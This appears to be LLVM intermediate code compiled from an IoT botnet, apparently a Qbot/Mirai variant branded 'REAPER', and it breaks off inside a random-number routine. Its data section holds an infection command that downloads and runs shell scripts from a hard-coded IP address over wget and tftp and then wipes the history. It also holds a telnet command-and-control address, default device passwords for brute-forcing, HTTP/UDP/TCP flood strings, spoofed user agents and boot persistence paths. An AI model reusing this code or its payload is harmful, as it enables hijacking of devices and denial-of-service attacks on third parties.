@.str.274 = private unnamed_addr constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00", align 1
@.str.275 = private unnamed_addr constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00", align 1
@.str.276 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00", align 1
@.str.277 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00", align 1
@.str.278 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00", align 1
@.str.279 = private unnamed_addr constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00", align 1
@.str.280 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.281 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00", align 1
@.str.282 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00", align 1
@.str.283 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00", align 1
@.str.284 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00", align 1
@.str.285 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00", align 1
@.str.286 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00", align 1
@.str.287 = private unnamed_addr constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00", align 1
@.str.288 = private unnamed_addr constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00", align 1
@.str.289 = private unnamed_addr constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00", align 1
@.str.290 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00", align 1
@.str.291 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.292 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00", align 1
@.str.293 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00", align 1
@.str.294 = private unnamed_addr constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00", align 1
@.str.295 = private unnamed_addr constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00", align 1
@.str.296 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00", align 1
@.str.297 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.298 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.299 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.300 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.301 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.302 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.303 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.304 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.305 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.306 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@AllDemDupes = global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.307, i32 0, i32 0)], align 8
@.str.307 = private unnamed_addr constant [16 x i8] c"70.32.30.177:23\00", align 1
@infect = global i8* getelementptr inbounds ([311 x i8], [311 x i8]* @.str.308, i32 0, i32 0), align 8
@.str.308 = private unnamed_addr constant [311 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://70.32.30.177/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 70.32.30.177 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 70.32.30.177; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@usernames = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.312, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.309 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.310 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.311 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.312 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.313 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [9 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.315, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.316, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.317, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.311, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.314, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.313, i32 0, i32 0)], align 16
@.str.314 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.315 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.316 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.317 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@HeliosCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.318, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.320, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.321, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.322, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.324, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.325, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.326, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.327, i32 0, i32 0), i8* null], align 16
@.str.318 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.320 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.321 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.322 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.323 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.324 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.325 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.326 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.327 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.328, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.329, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.330, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.331, i32 0, i32 0), i8* null], align 16
@.str.328 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.329 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.330 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.331 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* null], align 16
@.str.332 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.333 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.334 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.335 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.336 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.337 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.338 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@.str.339 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.340 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.341 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.332, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.334, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.335, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.337, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.338, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.339, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.340, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.341, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.423 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.342 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.343 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.344 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.345 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GetRandomPublicIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.346 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.347 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.348 = private unnamed_addr constant [93 x i8] c"\1B[1;33mLogin Found \1B[1;31mAttempting To Brute \1B[1;30mLIKE A GOD!!! IP:%s User:%s Pass:%s\1B[0m\00", align 1
@.str.349 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.350 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.351, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.353, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.354, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.356, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.357, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.359, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.361, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.362, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.363, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.364, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.365, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.366, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.367, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.368, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.369, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.370, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.371, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.373, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.374, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.375, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.376, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.377, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.378, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.379, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.380, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.381, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.382, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.385, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.386, i32 0, i32 0)], align 16
@.str.351 = private unnamed_addr constant [5 x i8] c"REAP\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.353 = private unnamed_addr constant [4 x i8] c"AWS\00", align 1
@.str.354 = private unnamed_addr constant [9 x i8] c"AWSPANEL\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"COCAINE\00", align 1
@.str.356 = private unnamed_addr constant [6 x i8] c"INSTA\00", align 1
@.str.357 = private unnamed_addr constant [16 x i8] c"FLEXINGONLAMERS\00", align 1
@.str.358 = private unnamed_addr constant [7 x i8] c"NULLME\00", align 1
@.str.359 = private unnamed_addr constant [8 x i8] c"STDMETH\00", align 1
@.str.360 = private unnamed_addr constant [9 x i8] c"BUTTHOLE\00", align 1
@.str.361 = private unnamed_addr constant [9 x i8] c"urnangay\00", align 1
@.str.362 = private unnamed_addr constant [7 x i8] c"vegena\00", align 1
@.str.363 = private unnamed_addr constant [5 x i8] c"no u\00", align 1
@.str.364 = private unnamed_addr constant [17 x i8] c"ovhhasalilweiner\00", align 1
@.str.365 = private unnamed_addr constant [17 x i8] c"TRAPNMODSISASKID\00", align 1
@.str.366 = private unnamed_addr constant [10 x i8] c"DANKPOWER\00", align 1
@.str.367 = private unnamed_addr constant [7 x i8] c"udpcri\00", align 1
@.str.368 = private unnamed_addr constant [7 x i8] c"STDCRI\00", align 1
@.str.369 = private unnamed_addr constant [15 x i8] c"NFOServers.com\00", align 1
@.str.370 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.371 = private unnamed_addr constant [6 x i8] c"haxor\00", align 1
@.str.372 = private unnamed_addr constant [15 x i8] c"aws.amazon.com\00", align 1
@.str.373 = private unnamed_addr constant [9 x i8] c"slav.com\00", align 1
@.str.374 = private unnamed_addr constant [9 x i8] c"AWS Menu\00", align 1
@.str.375 = private unnamed_addr constant [9 x i8] c"ganggang\00", align 1
@.str.376 = private unnamed_addr constant [10 x i8] c"instagram\00", align 1
@.str.377 = private unnamed_addr constant [6 x i8] c"rand0\00", align 1
@.str.378 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.379 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.380 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.381 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.382 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.383 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.384 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.385 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.386 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.387 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.388 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.389 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.390 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.391 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.392 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.393 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.394 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.395 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.396 = private unnamed_addr constant [6 x i8] c"PUSSY\00", align 1
@.str.397 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.398 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.399 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.400 = private unnamed_addr constant [38 x i8] c"HTTP %s Flooding %s:%d for %d seconds\00", align 1
@.str.401 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.402 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.403 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.404 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.406 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.407 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.409 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.410 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.411 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.412 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.413 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.414 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.415 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.416 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.417 = private unnamed_addr constant [159 x i8] c"\1B[1;37m[\1B[0;31mREAPER\1B[1;37m] \1B[1;36mDevices Loading\1B[1;37m ~> [IP] ~> [\1B[1;33m%s\1B[1;37m] ~> [BUILD] ~> [\1B[1;35mArch:%s\1B[1;37m] ~> [\1B[1;32mLOADED\1B[1;37m]\1B[34m\00", align 1
@.str.418 = private unnamed_addr constant [9 x i8] c"LELIMDUP\00", align 1
@.str.419 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.420 = private unnamed_addr constant [11 x i8] c"STOLENBOTS\00", align 1
@.str.421 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.422 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
